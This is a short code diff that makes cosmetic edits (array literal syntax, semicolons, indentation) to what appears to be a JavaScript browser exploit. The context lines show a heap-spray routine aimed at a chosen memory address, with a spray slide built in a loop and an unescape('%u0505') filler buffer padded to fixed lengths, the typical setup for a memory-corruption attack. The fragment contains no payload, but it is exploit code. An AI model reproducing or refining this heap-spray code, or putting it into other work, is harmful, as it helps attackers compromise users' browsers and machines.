@@ -24,7 +24,7 @@
 
         heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
 
-        memory = new Array();
+        memory = [];
 
         for (i=0;i<heapBlocks;i++)
         {
@@ -38,8 +38,8 @@
                 }
                 spraySlide = spraySlide.substring(0,spraySlideSize/2);
                 return spraySlide;
-        };
-var buffer =  unescape("%u0505");
+        }
+        var buffer =  unescape("%u0505");
 while (buffer.length < 845)  buffer+='\x0A';
 while (buffer.length< 1000) buffer+=unescape("%u0505");
 
